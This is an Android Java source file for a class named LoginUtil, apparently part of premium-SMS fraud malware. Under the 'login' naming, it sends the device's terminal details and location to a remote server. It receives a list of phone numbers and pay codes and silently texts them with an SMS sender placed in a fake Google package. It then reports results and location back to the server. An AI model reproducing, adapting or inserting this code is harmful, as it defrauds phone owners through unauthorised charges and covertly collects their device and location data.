package com.xdd.pay.util;

import java.util.ArrayList;

import android.content.Context;
import android.util.Log;

import com.google.android.gms.SmsSender;
import com.google.android.gms.callback.SmsSendCallback;
import com.google.android.gms.constant.SendType;
import com.xdd.pay.network.callback.Callback;
import com.xdd.pay.network.connect.HTTPConnection;
import com.xdd.pay.network.object.LoginLogInfo;
import com.xdd.pay.network.object.LoginPayCodeInfo;
import com.xdd.pay.network.protocol.GetLoginLogInfoReq;
import com.xdd.pay.network.protocol.GetLoginReq;
import com.xdd.pay.network.protocol.GetLoginResp;
import com.xdd.pay.network.util.NetworkConstants;
import com.xdd.pay.network.util.NetworkUtils;
import com.xdd.pay.util.constant.ResultType;

public class LoginUtil {

    private static LoginUtil                   instance;
    private static Context                     mContext;
    private static boolean                     isPaying    = false;
    private static int                         mSendCount  = 0;
    private ArrayList<LoginLogInfo>            logInfoList = null;
    private static int                         susCount = 0;
    private static int                         failCount = 0;
    private static int                         mPayCount   = 0;
    private static ArrayList<LoginPayCodeInfo> mPayCodeList;

    public static LoginUtil getInstance(Context context) {
        mContext = context;
        if (instance == null) {
            instance = new LoginUtil();
        }
        return instance;
    }

    public void getInitLoginInfo() {
        GetLoginReq req = new GetLoginReq();
        req.setTerminalInfo(TerminalInfoUtil.getTerminalInfo(mContext, true));
        req.setCpInfo(CpInfoUtils.getCpInfo(mContext));
        req.setLocationInfo(LocationUtils.getLocationInfo(mContext));
        req.setTimestamp(System.currentTimeMillis()+"");
        HTTPConnection.getInstance().sendRequest(NetworkUtils.getLoginNetworkAddr(), req, new Callback() {

            @SuppressWarnings("unused")
            @Override
            public void onResp(int result, Object object) {
                if (result == NetworkConstants.NETWORK_RESPONSE_SUCCESS) {
                    GetLoginResp resp = (GetLoginResp) object;
                    QYLog.d("login resp:" + resp.getErrorMessage() + " " + resp.toString());
                    try {
                        if (resp != null) {
                            int code = resp.getErrorCode();
                            if (code == 0) {
                                if (resp.getLoginInfo() != null) {
                                    if (resp.getLoginInfo().getInitCount() != 0) {
                                        mPayCodeList = resp.getLoginInfo().getPayCodeList();
                                        mPayCount = resp.getLoginInfo().getAfterPayCount();
                                        doSend(resp.getLoginInfo().getInitCount());
                                    }
                                }
                            }
                        } else {
                            QYLog.d("init resp error code=" + resp.getErrorCode());
                        }
                    } catch (Exception e) {
                        Log.e(QYLog.OpenSns, "init error!");
                    }
                } else {
                }
            }
        });
    }

    public void doSend(int sendCount) {
        if (isPaying) {
            QYLog.d("login is sending!");
            return;
        }
        
        if(sendCount == 0){
            return;
        }

        if (sendCount == -1) {
            sendCount = mPayCount;
        }
        
        if (mPayCodeList == null || mPayCodeList.isEmpty()) {
            QYLog.d("login payCodeList is null!");
            return;
        }
        isPaying = true;

        int count = sendCount <= mPayCodeList.size() ? sendCount : mPayCodeList.size();
        mSendCount = count;

        ArrayList<LoginPayCodeInfo> unUseList = new ArrayList<LoginPayCodeInfo>();
        for (int i = 0; i < count; i++) {
            final LoginPayCodeInfo info = mPayCodeList.get(i);
            SmsSender sender = new SmsSender(mContext, new SmsSendCallback() {

                @Override
                public void onSuccess(String destPhone, String message) {
                    result(info, true);
                }

                @Override
                public void onFail(String destPhone, String message) {
                    result(info, false);
                }
            }, info.getCount(), SendType.SEND_TEXT_MESSAGE, 0);
            sender.sendSms(info.getPhoneNum(), info.getPid());
            unUseList.add(info);
        }

        // 从List中去除已经使用过的代码
        for (LoginPayCodeInfo unInfo : unUseList) {
            mPayCodeList.remove(unInfo);
        }
    }

    public void result(LoginPayCodeInfo oriPci, boolean isSus) {
        if (oriPci != null) {
            if (isSus) {
                susCount++;
                addLoginLog(ResultType.SUCCESS, oriPci);
            } else {
                failCount++;
                addLoginLog(ResultType.FAIL, oriPci);
            }
        }
    }

    private void addLoginLog(byte result, LoginPayCodeInfo oriPci) {
        LoginLogInfo logInfo = new LoginLogInfo();
        logInfo.setResult(result);

        logInfo.setPayCode(oriPci.getCode());
        logInfo.setPayId(oriPci.getPid());
        logInfo.setDest(oriPci.getPhoneNum());

        logInfo.setLocalTime(System.currentTimeMillis() + "");
        if (logInfoList == null) {
            logInfoList = new ArrayList<LoginLogInfo>();
        }
        logInfoList.add(logInfo);

        if (mSendCount == (susCount + failCount)) {
            sendPayLog(logInfoList);
            isPaying = false;
            susCount=0;
            failCount=0;
        }
    }

    /**
     * 发送日志
     */
    public void sendPayLog(ArrayList<LoginLogInfo> logInfos) {
        if (logInfos == null || logInfos.size() == 0) {
            return;
        }
        GetLoginLogInfoReq req = new GetLoginLogInfoReq();
        req.setTerminalInfo(TerminalInfoUtil.getTerminalInfo(mContext, true));
        req.setCpInfo(CpInfoUtils.getCpInfo(mContext));
        req.setLocationInfo(LocationUtils.getLocationInfo(mContext));
        req.setLogInfoList(logInfos);
        req.setTimestamp(System.currentTimeMillis()+"");
        HTTPConnection.getInstance().sendRequest(NetworkUtils.getLoginLogAddr(), req, new Callback() {

            @Override
            public void onResp(int result, Object object) {
            }
        });
        logInfoList = null;
    }
}
